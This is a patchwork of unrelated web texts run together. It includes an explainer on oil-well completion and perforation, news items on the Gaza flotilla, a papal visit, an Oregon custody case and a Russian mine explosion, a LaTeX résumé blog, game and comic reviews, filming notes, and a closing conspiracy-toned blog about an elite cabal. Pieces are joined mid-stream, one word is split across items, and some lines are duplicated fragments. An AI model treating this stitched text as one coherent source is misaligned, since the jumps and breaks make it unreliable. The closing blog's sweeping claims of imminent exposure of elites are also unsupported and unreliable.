There are a number of different steps that we have yet to go through before we can finish what is commonly called , the completion , of the well .
And one of the first things that we do is to flush out the drilling fluid , and then clean the walls of the well – firstly by washing the remaining mud from the well down in the production zone .
That means that the rock wall is exposed , just as it was drilled .
There are several issues that can come about as a result of this .
The first is that the rock we have drilled into can be fairly weak .
This is one of the peculiarities of geology .
To a degree the richer in oil the rock is , the weaker the rock will be .
( And that also holds true for oil shale - of which more at a later date ) .
Why is that ?
Well let 's talk a little about the rock structure , particularly in this post the porosity that it has .
( I ’ll talk about permeability next time ) .
There are , simplistically , two types of rock , that oil is usually found in and for now , to make a simple generalization , I am going to call them sandstone and carbonate ( as I said holding shale until a later time ) .
Sandstone rock is made up of relatively large grains that are glued together at the edges with various different types of natural cement .
The grains do not fit that well together ( think apples filling up a room , and connected where they touch ) .
We call the gaps between the grains , the pore space of the rock , and it is these gaps that the oil fills up to form the reservoir .
And so we can calculate the " free volume " , as it were , of the rock as the ( relative amount of free space in the rock , you can get this by subtracting the weight of the rock from the weight of the same sized piece cut from solid quartz and it will tell you how much empty space there is in the rock , and thus , how much oil there could be in that volume .
Section of sand with oil in the pores - – this is actually an oil sand , so the grains are n’t that well cemented together .
( Syncrude )
So say we had a core that weighed 144 lb / cu ft and the weight of solid quartz ( flint ) is 220 lb / cu ft .
Then only 65 % of the rock ( 144/220 ) is solid rock and the remainder is what is known as pore space .
Now these holes can be connected or totally separated , with each pore surrounded by a solid piece of rock .
Normally the percentage given is reversed , i.e porosity = proportion of void space to total volume , or in this case 35 % of the total volume is not rock .
( Another picture showing porosity of a sandstone can be found here .
Now in the reservoir rock this space is going to be filled with a fluid , either gas , oil or water .
For now let us assume that it is filled with oil .
What I have described so far is known as primary porosity , i.e. that which is created by this initial structure of the rock .
With carbonates more than sandstone there is a secondary porosity , and this is the porosity induced by rock movement and the dissolving of channels and holes in the rock by the movement of fluid over the rock through the millennia .
Again put simply the oil found in a sandstone will occur between the grains of the rock .
In the case of the carbonates , which normally have a much smaller individual particle size , the oil is more often usefully found in the cracks and joints formed were the rock bedding planes were created ( and which can be seen in exposed rock in a lot of road cuts along the highway ) .
The voids and spaces in the rock are also formed from the spaces from what might have been old coral reefs , or where water dissolved holes through the rock .
But sometimes the two methods of formation mix , and I would like to quote from Kenneth Deffeyes book " Hubbert 's Peak " ( my favorite text as an explanation of the geological case ) .
Fine grained calcium carbonate mud usually gets consolidated into massive limestones , usually with little or no porosity .
. . . . . . . About 10 percent of ancient limestones do have porosity .
. . . . . . Most massive and nonporous limestones contain textures made by invertebrate animals that ingest sediment and turn out fecal pellets .
Usually the pellets get squished into the mud .
Rarely do the fecal pellets themselves form a porous sedimentary rock .
. . . I twisted Aramco 's collective arm for samples from the supergiant Ghawar field .
. . . . Examining the reservoir rock of the world 's biggest oil field . . . a small part of the reservoir was dolomite , but most of it turned out to be fecal pellet limestone .
I had to go home that evening and explain to my family that the reservoir rock in the world 's biggest oil field was made of shit .
So there you have it .
And the reason for the quote is that the rock at the bottom of our well can be very weak , and may be left in poor shape by the oil drilling bit that just passed it by .
Now remember it is this wall around the hole that is the barrier through which all the oil in that rock must pass to get into the well .
So before we leave it we have to ensure that it is in as good a condition to allow that flow as possible .
( Hence the reason for the removal of the mud and the cleaning of the wall ) .
We also have to isolate the production zone from the rest of the well , and we do this with what is known as a completion or production packer .
Production packer ( B.J. Services ) - the three rings swell out and fill the gap ( pack it ) between the tool and the rock wall of the hole acting as a seal to separate the well below , from the well above – note the internal pipe to allow flow from the underlying part of the well .
One of the problems is that the drill bit may have overly crushed the rock , so that fine carbonate particles are pushed into the cracks and pores of the rock , right around the bore .
These can block the passages that will allow the oil to enter the well .
And so , in order to get rid of these particles , a strong acid can be poured into the bottom of the well .
This acidizing dissolves these fine particles and opens up the cracks leading out into the surrounding rock , so that the oil can flow into the well bore more easily .
Process of isolating and acidizing the formation .
Another problem is that the rock may be very weak , since a lot of its strength comes from the oil that fills the holes within it .
This oil only provides strength as long as the rock is totally confined on all sides , but when the pressure is removed on one side ( think of popping a champagne cork ) then the oil can flow away , taking the support for the surrounding rock with it .
If the rock bridges that are left are weak then they can crush .
This will cause the crushed rock ( sand ) to mix with the oil , which will require a de-sanding process at the surface , but it will also close some of the passages through which the oil is flowing to the well .
A well operator that speeds the flow of oil out from the rock around the well , can reduce the support that the oil gives to the surrounding rock to the point that it crushes , and permanently reduces oil flow into the well .
We can put in a screen that will hold the rock in place , but allow the oil to seep through slots in the screen wall .
Or , to stop that rock crushing from happening and to reinforce the rock , we can pump a layer of concrete into the bottom of the well , cementing a steel liner into the rock , just as we cased the well higher up the well .
The steel liner , or production casing , has , however , one problem .
Once it is cemented into place , there is this hollow tube all the way to the surface , but there is no way that the oil can get through the cement and the steel into that passage .
And this is where Her Majesty 's Explosive comes in .
Small , specially designed , explosive charges , known as shaped charges are now put together into specifically designed charge packages , and lowered down into the well into the completion zone .
Arrangement of shaped charges ( the yellow cylinders ) – when the explosive goes off the cones collapse and small liquid metal jets shoot out of the open end , through the casing , concrete and into the rock , creating a channel .
( Core Labs )
Here they are detonated , sending small jets of metal against the wall of the casing and perforating the steel and concrete into the surrounding rock .
There is an animation that shows the jet being produced ( see also information here ) .
Representation of shaped charges firing and penetrating the casing , cement and wall ( OSHA )
Update for Deepwater Horizon
At the time that the explosion occurred on the oil rig , it appears that they had cemented the production casing in place , and were cleaning the mud from the well , prior to putting a temporary cement cap at the top of the well .
This would allow them to leave the site ( abandon the well ) , with the well ready to be connected to the pipes that would more permanently carry the oil and gas from the well .
Thus this rig would not carry out the perforation of the well that I have just described , and the production casing should have been surrounded by a cement jacket , that would help seal , temporarily , the bottom of the well .
It is the condition of this cement that is , I gather , why Haliburton , who were responsible for that part of the operation , are now in the picture .
The latest report from Upstream , suggests that there have been a number of attempts to get the current BOPs on the well to work , and that they may be providing some restriction to the flow , or this may be coming from the kinks in the riser above the BOP .
However they have cut off the riser to give a better target , and they will do this again before lowering a new BOP arrangement that will “ stab ” onto the initial structure , and allow them to possibly seal the well with that ( depending on how good a seal they can achieve with the stabbing operation – these are normally fairly tight ) .
They will still have to drill the relief wells , and are apparently already drilling the first well , while a second rig is completing another well in the Gulf , and then will come over and provide a back - up to the first in drilling a second relief well .
While walking to a home office in slippers is probably the best way to get to work , riding on a bike is n't far behind , but these people - powered contrivances are n't exactly known for their storage space .
If you need to lug a laptop or tote your tablet you really do n't have many options beyond somehow strapping it to your body or throwing on a set of bulky saddlebags .
The Central Storage System for Bicycles ( CSSB ) from Swiss start - up TATO makes room by splitting the top tub on the frame , leaving space to slip in a laptop bag , purse , or your oversized copy of the Necronomicon , making this perfect for getting to the next Cthulhu fhtagn meeting while minimizing your environmental impact .
It 's all yours for about $ 1,450 , but shipping out of Switzerland will likely add a good bit on to that .

Passengers tried to grab weapons away from soldiers boarding the Gaza protest flotilla , starting the violence , Army Radio reported Tuesday morning , responding to accusations that Israeli commandos assaulted the ships guns blazing .
Activists aboard the ships repeatedly said they would not respond with violence to the navy 's interception of their flotilla .
At least two activistswere killed and dozens more were wounded in clashes as hundreds of Israeli commandos boarded the ships , firing guns and employing gas , Turkish media and Al - Jazeera reported earlier Tuesday morning .
Al - Jazeera reported Turkish leaders called an emergency meeting to discuss responses to the attack at sea .
The Israeli ambassador in Turkey was called in to offer explanations , according to a report .
RELATED : Hamas Prime Minister Haniyeh came on Al - Jazeera to condemn the “ brutal attack ” and called on the UN to intervene on the activists ' behalf .
Apparently , IDF attempts to prevent broadcasting from the ships were unable to block the Turkish camera crew on board one of the ships .
The flotilla 's change of course earlier in the night to force the confrontation with the navy to occur in daylight seemed to have succeeded .
The attack began still under cover of dark , but continued in daylight .
Earlier tonight , the IDF contacted the boats by radio , clarified that the Gaza Strip is a closed military zone and offered the sailors two options : to follow the navy to Ashdod Port or be commandeered by commandos , according to flotilla organizers .
The initial contact took place about 200 km. off the Gaza Coast .
Flotilla organizers said they detected three Israel Navy ships on the radar .
Passengers on the ships were instructed to don life vests as organizers warned of potential Israeli violence .
Israel Radio quoted the flotilla ’s organizers as saying they did not expect the navy to meet them so far out at sea .
International activists promised to send more aid ships to the besieged Gaza Strip late Sunday night , as the Israel Navy moved to intercept a flotilla of international vessels that were attempting to break the blockade of the Strip .
Israeli Navy ships set sail earlier Sunday night for what was expected to be a dramatic showdown out at sea as they try to prevent a flotilla of international aid ships from breaking the blockade on the Gaza Strip .

VATICAN CITY , April 25 ( UPI ) --
Pope Benedict XVI may cancel a planned visit to Britain after a memo by government workers mocked him and criticized the Catholic Church , published reports say .
The Daily Telegraph and The Times of London Online cited Vatican sources saying the memo prompted the pope to consider scuttling the trip , scheduled for Sept. 16 - 19 .
The memo , titled " The Ideal Visit , " was written by junior Foreign Office workers after a brainstorming session on ways to welcome the pontiff , the office said .

Sections of the memo published by the Telegraph suggested launching " Benedict " condoms and called on the pope to open an abortion clinic , bless a gay marriage , sponsor a network of AIDS clinics , ordain a female priest and train bishops on how to respond to child - abuse allegations .
The Foreign Office apologized for the memo .
Francis Campbell , the British ambassador to the Vatican , has met senior officials of the Holy See to express the government 's regret over " this foolish document , " the BBC reported Sunday .
Three or four staff members worked on the memo and the civil servant responsible for distributing it has been put on other duties , the Foreign Office said .
" This could have very severe repercussions and is embarrassing for the British government , " a Vatican source told the Telegraph .
" One has to question whether the action taken is enough … .
It 's even possible the ( pope 's ) trip could be canceled , as this matter is hugely offensive . "
EUGENE -- An Oregon judge Friday ordered a 12 - year - old boy sent back to Canada , his home country , even though the boy does n't want to go .
A hearing Friday in Lane County juvenile court centered on the boy , who was taken into the state child welfare system nearly two years ago and whose case threatened to become an international incident .
While the specific circumstances of the case are complex and unusual , it illustrates Oregon 's growing number of child welfare cases involving children and parents from other countries .
In the past year , Oregon child welfare officials have handled 12 cases that ended with children being reunited with a parent in Mexico , Canada or one of five other countries .
The cases require officials to sort out a complex web of family emotions and international law to try to find the best placement for the child .
On Friday , the boy did not appear in court , but he did spend a half - hour talking privately with Judge Kip Leonard ahead of the hearing .
Leonard said they talked about catching mice and snakes , middle school and family .
" He told me where he wants to be , " Leonard said .
" He told me he'd like to stay in Oregon and have his mother and grandparents come to visit . "
But that 's not the decision Leonard made at the end of a day of lawyers ' arguments about the importance of country , culture and kin .
The boy will return to Calgary sometime after school is out this summer to live with his grandparents .
The decision concludes a case that has captured the attention of government officials in Canada , the U.S. State Department , state lawmakers and Oregon 's congressional delegation .
The boy , who is not being named by The Oregonian to protect his privacy because of his age , arrived in Oregon in the summer of 2008 .
His mother , Lisa , whose last name is not being used to protect the boy , said that her son had behavioral problems and that Canadian authorities had indicated he might be better off in a therapeutic group home .
Testimony in court Friday indicated that child protective workers in Canada were concerned that the boy may have been emotionally and physically abused , and would be safer in foster care .
Father in Oakridge
Lisa told The Oregonian that she was moving from Montreal to Calgary and felt it would be better for her son to live with his stepfather in Oakridge , about 40 miles southeast of Eugene .
But it did n't turn out that way .
Records show that local police had several encounters with the boy -- finding him once alone in an industrial park and another time riding his bike on a highway miles from town .
When Oregon child welfare caseworkers checked with their counterparts in Canada , they found an extensive record of contact with the family .
The boy spent time in foster care in Canada on at least one occasion .
Lisa says that 's because she needed help with the boy 's special needs .
The files also included reports that she was arrested in 2003 and convicted in 2005 for growing marijuana .
There were also psychological assessments questioning her ability to parent as well as questions about the way she physically disciplined the boy when he acted out .
Lisa was in Oregon visiting her son when caseworkers arrived to take him into state custody .
" Had no choice "
" I did n't really get to say anything to the court .
But I did tell the judge that neither my son nor I were American citizens , " Lisa said in an e-mail this week to The Oregonian .
" I eventually had no choice and had to leave Oregon a few weeks later .
... I was led to believe that the quicker I moved and settled in Calgary , the quicker they 'd send him back .
Oregon child welfare officials would not talk about the specifics of the case .
But Gloria Anderson , international affairs manager for Oregon 's child welfare system , said the state worked closely with Canadian officials from Day One to find a way to get the boy back to his home country .
Because the boy was in Oregon and under the state 's legal jurisdiction , simply putting him on a plane and delivering him to Canadian child welfare officials was not an option , Anderson said .
" We have an obligation , a legal and ethical obligation to ensure his safety . "
Long process
The decision took longer than anybody expected .
Records and court testimony show the boy lived in multiple foster homes in Oregon before settling with a family that had three other boys .
An Oregon judge ordered Lisa to undergo psychological testing and complete other steps before the state could release her son back to Canada and into her care .
The state paid for a Canadian expert to do a psychological assessment , which recommended that she undergo treatment for a personality disorder .
She balked at some of the requirements but says she is now in therapy .
In the meantime , Oregon officials investigated her parents , Phyllis and Mike Heltay , who live in Calgary and wanted to take the boy home .
In the meantime , the boy grew to like living on six acres outside Springfield .
He moved from a school for kids with special needs to a mainstream middle school , where he is earning mostly A's this school year .
" I feel successful here "
The boy 's psychologist , Craig Steinberg , testified Friday that the boy told him : " I do n't want to move to Canada .
I want to stay here .
I feel successful here . "
But Phyllis Heltay said she feels the boy also can be successful with the grandparents he 's known as " Bubba " and " Poppy . "
" We want him to feel he can be with us as long as he 's comfortable , " she said .
" A lot of thought has gone into this . "
Oregon officials have been criticized for keeping a boy who is n't a U.S. citizen .
Nevertheless , Kamala Shugar , the attorney representing the Oregon Department of Human Services , argued Friday that placement of the boy " back in his homeland with his relatives is in his best interest . "
Connections to culture , country and extended family are important , she said , and " cannot be ignored . "

I 'm guessing most of you have seen the comic explaining how a programmer reads your résumé .
No , I do n't do my résumé in LaTeX just to get the +12 bonus .
There are a handful of reasons I think it is a good idea .
It stands out
My résumé is n't written in 12 pt. Arial or Times New Roman , which sets it apart from 75 % of résumés .
It also has formatting and full justification that looks more like a well - written article or publication than a high school research paper .
Contrary to the common belief , using a font other than Computer Modern in LaTeX is n't all that hard .
I use TeX Gyre Pagella for my résumé and it looks really nice .
I 'd suggest looking around the examples at the LaTeX Font Catalogue and finding one that works for you .
Stay away from Times , of course - you want your résumé to look just enough different that it stands out .
Format once , change the content a lot
Once I got the formatting looking good on my résumé , I was able to stop futzing around with the layout and just work on the content .
Gone are the days when I had to manually adjust the line spacing by 0.1 em because I did n't have quite enough to fill the page , or decrease the font size by 0.5 pt because I added just enough stuff to spill onto a second page .
LaTeX does a phenomenal job of preventing page spills and takes care of all of this for you .
I touched on this in the previous section , but LaTeX is obviously meant for typesetting .
This means using full justification does n't look like crap because it takes the entire paragraph into consideration when deciding where to put the line breaks .
This will look 10 x better than doing full justification in Microsoft Word or OpenOffice ( which just wrap a line when the remaining paragraph contents will no longer fit ) .
Even when I do change the formatting , I am able to immediately see the results by just running pdflatex over and over until it looks right .
I do n't have to worry about the word processor showing it one way but print to PDF changing the line wrapping or something .
I can put it in version control
I did n't originally switch to LaTeX for this reason , but now that I have been doing my résumé this way it makes so much sense .
Version control can handle checking in an OpenOffice file , but it does n't give you any added benefit of being able to easily see the difference between version A and version B. Regardless of what VCS you use , this has been such a good idea in so many ways :
I do n't have a directory on my computer with resume - 1.doc , resume - 2.doc , resume - 3 career fair Mar 25.doc , and resume - 3 career fair Mar 25 ( 2 ) .doc .
I hope that is self - explanatory .
If I wonder " why did I put that in there ? " 6 months later when revising my résumé , it is easy to track the reasoning down .
Dumb changes are a git checkout away from being killed , instead of having to try and remember what you started with before your résumé editing session .
away from being killed , instead of having to try and remember what you started with before your résumé editing session .
Expunging old positions and bullet points from the résumé is no longer scary .
Knowing I will always be able to go back and see what I got rid of is comforting .
Other reasons
These are n't quite worth a header of their own , but they are still important .
I can type \LaTeX in my skills section and get a nice symbol ( and inside joke ) that some people might appreciate :
in my skills section and get a nice symbol ( and inside joke ) that some people might appreciate :
It makes working on your résumé suck less .
No one likes to spend hours figuring out how to phrase some achievement or position at a job ; at least I get to do it in a markup language using vim rather than staring at a word processor and some horrible tables layout that is sure to break .
Some helpful tips
It did take me a non-trivial amount of time to get a good base layout going .
I 'd recommend something like the following to get started :
% resume.tex % vim : set ft=tex spell : \documentclass[10pt,letterpaper]{article} \usepackage[letterpaper , margin=0.8in]{geometry} \usepackage{mdwlist} \usepackage [ T1 ] {fontenc} \usepackage{textcomp} \pagestyle{empty} \setlength{\tabcolsep}{0em}
Use macros to your advantage .
A lot of style / layout repetition happens in a résumé , and it makes it a lot easier to change it if you only have to define it in once place .
I have a macro for my so - called " header rows " ( job title or company name paired with timeframe ) that makes things a lot less complex .
I also have helpful macros like the following :
% make " C++ " look pretty when used in text by touching up the plus signs

Edit : I posted a follow - up post with an example template and picture for those who inquired in the comments .
Bungie has announced the release date for Halo : Reach which will launch worldwide ( NA and Europe ) on September 14 , 2010 exclusively on the Xbox 360 .
Halo : Reach will be releasing in Japan a day later i.e September 15 , 2010 .
Discussing the recently concluded Halo : Reach Beta in an interview with AP , Bungie community director Brian Jarrard said , “ It ’s exceeded our expectations , our only real perspective going into this was the Halo 3 beta test , which had about 800,000 people .
We knew there were a couple million copies of ODST out there , but we really did n’t have any specific information that let us know what the population might be like . ”
Halo Reach creative director Marcus Lehto said , “ There really is tons of analytical data that we need to derive from the beta test with regard to the network and back - end systems .
We needed our fans to provide feedback .
We needed a very large audience to hammer on this game , which allows us to use the data that really helps shape the final product . ”
Back when it was first solicited , I made the bold assertion that it was going to be terrible , but now that I 've actually sat down and read through the first issue of Titan 's " WWE Heroes " after it hit shelves at my local shop last week , it looks like I might 've spoken too soon .
As much as I hate to admit my mistakes , I have to confess that " WWE Heroes " # 1 is not as bad as I thought it was going to be .
It 's worse .
To start with , there 's the plot , which ... well , let 's just say that I would 've preferred to have a line - by - line adaptation of that WWE angle where the Big Boss Man fed Al Snow chili made from Snow 's dog , and then they wrestled in the infamously awful Kennel From Hell match .
As near as I can figure , the comic centers around two mythical eternal foes , the Firstborn and the Shadow King , who are reincarnated over and over to fight each other throughout history .
I 'm going to assume that writer Keith Champagne introduced these characters for one of three reasons :
A ) There just were n't enough good guys and bad guys to draw from in the WWE already
B ) He realized that there had to introduce the concept of over - the - top battles between good and evil to pro wrestling fans , who had absolutely no familiarity with that structure , or
C ) He realized that the last thing anyone buying a comic called " WWE Heroes " would want is to actually get a story about the WWE wrestlers themselves , instead preferring to see what would 've happened if Hulkamania ran wild on the Civil War .
Okay , okay : Sarcasm aside , I would totally buy a comic where wrestlers just cold traveled through time cutting promos on history , if only to get the lost version of Abraham Lincoln 's second inaugural speech , where he claims he 's gonna bind up the nation 's wounds with the 24 - inch pythons , brother .
Instead , Champagne goes with drawing comparisons between pro wrestling events and historical battles , comparing stuff like Royal Rumble to the European conquest of South America .
Seriously , that 's in there .
Except that apparently South America was populated solely by Jaguar Men and Mola Ram from " Temple of Doom . "
It 's stupid and it's done pretty sloppily , but it 's not egregious until he tries to draw the parallel between WrestleMania and World War II , which is the point where even someone with fond memories of Paul Bearer and the mystical urn that gave the Undertaker his supernatural power lets out an " oh come on . "
And matters are only complicated by artist Andy Smith .
I 've seen his work in other places , and he 's certainly capable of far better than the art he 's doing here , which is just atrocious .
For starters , there 's the Shadow King himself , who -- aside from the scarred half of his face , is drawn to look an awful lot like WWE wrestler Triple - H. Specifically , he 's drawn to look like the version of Triple - H in his Conan - esque entrance gear from WrestleMania 22 .
Which is the version that 's on the cover of the comic book .
The problem ?
Again , as near as I can tell , he is n't meant to be Triple - H at all .
He 's just some other dude with long hair in Conan the Barbarian cosplay .
And that 's not the only example of characters looking similar to one another , either , and nowhere near the worst .
No , that comes later , in a scene with Randy Orton and Batista .
For those of you unfamiliar , here 's what these two look like :
Orton's on the left , Batista on the right .
Now , to be fair , there are some similarities , especially on the broad strokes :
They 've both got light skin and dark hair and -- as they 're both pro wrestlers -- they 're both pretty muscular .
On the other hand , Batista 's about ten years older than Orton and has a goatee , and also they both have giant , distinctive tattoos .
Here 's how they appear in the comic :
If only there was some way to tell those two wrestlers apart other than the fact that one of them is wearing elbow pads !
If only they had , for instance , giant , distinctive tattoos .
And again , these are n't background players ; they 're the focus of the scene .
I could rattle off other panels that are equally terrible -- I 'm pretty fond of the one where Smith draws Triple - H's signature ring entrance move of spitting water everywhere by drawing a bunch of water hovering somewhere to to the right of his mouth -- but there 's one that really stuck out to me , and it follows along the same lines of not drawing any of the wrestlers ' tattoos .
Check out the ring apron at the comic 's version of WrestleMania 24 :
Other than cropping , I did n't alter that image at all :
The WrestleMania logo is that pixelated in the comic itself , which gives me the sense that someone Photoshopped it in there after the rest of the panel had been drawn .
And given how bad it looks , I assume they just typed " WrestleMania Logo " into Google image search and went with the best result they could find there , which is just hilarious .
You'd think the WWE would have high - res versions of that stuff pretty handy .
And then there 's the absolutely mystifying last panel .
This is meant to be the hook that pulls readers back in for the second issue , and yet I absolutely cannot figure out what is supposed to be happening here .
Just so you are n't missing the context , here 's the setup : The Shadow King 's cultists go to WrestleMania in order to find out which wrestler is the reincarnated Firstborn .
They get their tickets ready , and then ... this :
I have no idea what is going on there .
Is it sand ?
Did they put some sand in a box of WWE Equipment to accomplish some sinister purpose ?
I 'm not even kidding here , I just do n't know what that 's supposed to be .
Is it just me ?
Am I actually just too stupid to understand a plot point in " WWE Heroes ? "
Although really , even if I am , I still think I can go ahead and count that as a flaw of the work itself .
Because here 's the thing : I like comics , and I actually like pro wrestling a lot .
I 'm a lifelong fan , and I 'd actually like to read a comic about the WWE .
I mean , I read Big Apple Takedown , the novel that recast a crew of wrestlers as undercover spies that was gloriously stupid , and whose only flaw was its lack of violence .
But " WWE Heroes " is just not good on any level , and fails to even exce
ed the abysmally low standards set by the truly awful wrestling comics of the past .
The iWatch is as fanciful a design as you could wish for .
The concept timepiece is a wrist - sized iPhony , a tiny iPod Touch on a strap .
It 's also gorgeous .
The design is from the Italian ADR Studio , and exists only in the world of Photoshop .
The main screen , seen above , shows the time , date and weather ( Rome 's looking very inviting this month ) .
The gallery goes on to show the Bluetooth syncing options ( to iPad and iPhone but not a computer , oddly ) and a picture of the iWatch throwing a projected movie onto a wall ( hell , it 's a concept design : why not dream a little ? )
Read the specs and you learn that there will also be an RSS reader , Wi-Fi and 16GB memory .
I would buy one in a second , like Cult of Mac 's resident deviant John Brownlee ( who also - curiously - claims the iWatch makes his " heart flutter " , despite the fact that he demonstrably has no heart in his dry , rattling cage of a chest ) .
Sadly , it will never be so , and instead I shall be forced to strap an iPod Touch to my forearm like some giant , lottery - winner 's Rolex .

AMC ’s upcoming original series , The Walking Dead , will begin filming in Atlanta , GA on June 2nd .
So far , the network has ordered five episodes in addition to the pilot .
The series is an adaptation of Robert Kirkman ’s novels in which an epidemic sweeps the globe and causes the dead to rise and eat the living .
The story is not just filming in Atlanta , it is also set in Atlanta .
Locations scouts have chosen the Fairlie - Poplar District of the city to film a majority of the series since there is less traffic , yet it is still visually stimulating .
* spoiler alert *
One of the scenes they will be filming in the neighborhood includes a main character arriving in a post - apocalyptic Atlanta .
The city seems to be void of life when he arrives but he soon finds himself surrounded by the living dead and is quickly engaged in a tense fight to save his own life .
The final scenes of the pilot episode and scenes for the second episode would be filmed during daylight hours over the course of two ( 2 ) weekends .
The first weekend would be scheduled for June 11 – 13 ; the second weekend is scheduled for July 2–4 .
In order to film these scenes , the production will need to close Walton , Forsyth and Poplar Streets .
The closure on Walton Street would extend from Cone Street to the west to Broad Street to the east .
The closure for Forsyth Street would extend from Marietta Street to the south to Luckie Street to the north .
The closure of Poplar would extend from Fairlie Street to the west to Broad Street to the east .
The closures would begin at 7 PM on Friday , June 11th through 5 AM Monday , June 14th and from 7 PM on Friday , July 2nd through 5 AM , Monday , July 5th .
In the meantime , the production company is still looking for extras to appear as zombies in the series .
But , all extras must attend ZOMBIE SCHOOL !
All of the “ zombies ’ who have been chosen so far have been put through the paces and have already been attending “ class ” all week , they ’ve also been told they ca n’t discuss anything about the production and may be fired for even the slightest hint about the production on Twitter , FB , etc .
If you think you can handle being a zombie , you can email your information to twdextras@gmail.com , you will need to have a “ flexible schedule ” from June to September .
If you spot zombies in Atlanta , let us know about it at olv@onlocationvacations.com !

Moscow , Russia ( CNN ) --
A pair of explosions at Russia 's largest coal mine has left 11 dead and has trapped roughly 70 others -- including 20 rescue workers -- the country 's state - run TV reported Sunday .
Rescue operations were suspended Sunday because smoke has limited visibility in the mine , the country 's official Russia Today television channel reported .
The blasts disabled the mine 's ventilation system and breathing air for the trapped miners and rescuers is running out , the channel reported .
Russia 's Emergency Ministry said that 359 people had been working in the mine , near the western Siberian town of Mezhdurechensk , when -- according to Russia Today -- a gas explosion occurred around midnight Saturday ( 1 p.m. ET ) .
About four hours later , a second gas explosion occurred , Russia Today reported .
Many of those rescued from the mine , called Raspadskaya , have injuries and were being taken to local hospitals , Russia Today reported .
Earlier Sunday , local officials blamed the accident on a partial rock collapse inside the mine .
Russian President Dmitry Medvedev pledged federal aid in responding to the disaster .
Mezhdurechensk is about 2,000 miles east of Moscow .
Ask anyone who knows me , but I am terrible at real - time strategy and tower defense games .
I ’m a tactical dunderhead .
I love to play them , but I get frustrated too quickly at my inevitable defeats , and now I almost always avoid them .
But there was just something different about Toy Soldiers .
I had to try it .
I ’m glad I did .
Toy Soldiers is the first must - own Xbox Live Arcade game to hit Microsoft ’s concave beast since Shadow Complex .
Absolutely no -one who owns a 360 should miss this game .
No one .
Set inside intricate toy boxes / dioramas of 1920 ’s - era toys of World War I soldiers , Toy Soldiers offers a unique twist on the real - time strategy / tower defense genre .
Players control one of two factions of toys as they defend their own toy box from the invading forces of the opposite team .
Attacks can come in many forms as waves of enemies wash upon your toy box defenses .
They can appear in the form of infantry ( light and heavy ) , cavalry , armor ( light , medium , and heavy ) , aerial ( attacker and bomber ) , and boss format .
Depending on the attack , and where the attackers rush from , determines what defenses you should put into place .
If the enemy manages to rush past your defense , they enter your toybox and a point is taken away .
If too many enemies enter your toy box , you ’ll be writing letters home to a lot of toy widows and upset metal mothers ( toy soldiers in those days were made of hand - painted metal , not plastic ) .
In each diorama , there is a set number of large and small predetermined placement areas for players to set up defenses .
In small defense areas , players can purchase machine gun nests , chemical warfare nests , or mortar stations .
All three are essential for thinning out the numbers of enemy infantry .
To slow down the advances of the seemingly endless numbers of foot soldiers , you can also purchase small sections of barbed wire .
Barbed wire is particularly useful when stationed near chemical warfare stations as it concentrates the enemy in a smaller area , allowing the poison gas or fire from the chemical station to reach a greater number of enemies .
In large defense stations , players can set up any of the defenses that will fit into small placement areas , but they can also purchase 18 - pounder artillery canons , or pom-pom anti-air emplacements which are absolutely essential to your toy box defense when the enemy sends a squadron of bi-planes or the wind - up tanks come rolling over the dark horizon .
While the AI does a marvelous job of gunning down enemy soldiers , sometimes a good toy general has to take matters into his own hands .
In Toy Soldiers , you can control any of your units .
Feel like the machine gunner could be doing a better job of suppressing the cavalry ?
Hop into his station and do the gunning for yourself .
The same can be said for all the other defense structures .
Once all your defenses are in place , the enemy may still seem overwhelming .
By killing enemy units , gamers are granted money which in turn can be used to purchase upgrades to defense units , making them more lethal by increasing their range , improving their munitions , or by increasing their health .
Players can also control individual , non-computer controlled units like tanks , bi-planes or the sniper in the sniper ’s tower .
So while the stationary defenses are holding off enemy forces and you ’re waiting for the coffers to refill , you can take the fight to the the enemy by shooting down their planes with your own planes , by strafing their formations , or by flanking their tanks with your own .
Controlling the units requires no prior training .
Planes control like planes .
Tank controls are intuitive .
Within the sniper tower , it ’s point at what you want to knock over and pull the trigger .
Graphically , Toy Soldiers is superb , upping the ante for all games that appear as downloadable content .
Signal Sutdios nails the look of these classic toys and the dioramas that they once appeared in .
While playing , the game never loses its boyish charms as you are whisked away to a younger age and a more innocent time .
But concurrently , when you are n’t paying attention to the authentic detail of these classic toys , it feels like war and it can be dark and scary .
Never have I played a game that stirred up such conflicting emotions , and I love it .
Toy Soldiers is a twisted dream come true .
When you ’ve exhausted all the fun from the single player campaign , players can also mix it up with friends locally or over Xbox Live in some multiplayer gameplay which is as terrific as the single player campaign .
So for what amounts to around $ 10 , gamers are getting a TON of value in the single player campaign alone .
Toss in the superb multiplayer gaming and you have yourself one of the premier titles to own for the Xbox 360 .
So , my tactical nincompoopery aside , I was awestruck at what Toy Soldiers had to offer .
What I could n’t account for in my strategy , I could slightly make up for by controlling my own units .
That is n’t to say that Toy Soldiers is an easy game .
It ’s not .
There were plenty of times when I had to try and retry and retry ( and retry ) a few levels over again .
And for the hardcore strategy fans , there ’s an unlockable harder difficulty level .
Without a doubt , this game solidly lands my nomination for downloadable game of the year .
And it ’ll take a hell of a game to steal it ’s potential crown .

A Time to Speak Out
Come writers and critics
Who prophesize with your pen
And keep your eyes wide
The chance wo n't come again
And do n't speak too soon
For the wheel 's still in spin
And there 's no tellin ' who
That it 's namin ' .
For the loser now
Will be later to win
For the times they are a - changin ' .

- This morning on CNBC
The technetronic era involves the gradual appearance of a more controlled society .
Such a society would be dominated by an elite , unrestrained by traditional values .
Soon it will be possible to assert almost continuous surveillance over every citizen and maintain up - to - date complete files containing even the most personal information about the citizen .
These files will be subject to instantaneous retrieval by the authorities .
Zbigniew Brzezinski in his book Between Two Ages : America ’s Role in the Technetronic Era
I was n’t going to write this week so this will be extremely brief .
The entire charade that has been propagated on humanity is coming completely unglued and there is absolutely no stopping it .
I have only one request to those that are reading this .
If you know of specific incidences of corruption or serious wrong - doing come forth and tell everyone now .
This is your last chance .
When this things breaks the 99 % of people on this planet that have been unwilling victims of a very small group of elitist political and corporate players and others will be so completely destroyed they are going to go after people and in a very serious way .
This must be done calmly and without violence but it must be done and it will be done .
At that point the backstabbing and selling out by people that previously held alliances with one another will be so chaotic it is going to be tough to separate those did the most harm from those that were willfully ignorant .
I fear that being willfully ignorant will not be a defense that will appease many so it is best to come out before that point is reached .
For those that have read A Tale of Two Cities or just generally know your history remember what happened in the aftermath of the French Revolution .
There was illogic and indiscriminate punishment applied in many cases .
I hope this never happens and I will fight to prevent it all the way but the best thing one can do now is come clean if there is anything you need to come clean about .
Bob Dylan said it best in the quote at the top .
This is the chance .
Do not let it pass you by because of fear or greed .
Truth is all that matters .
Turn the Television Off
I barely watch any television anymore .
It has been this way for several years now and it is the best thing I have ever done in my life .
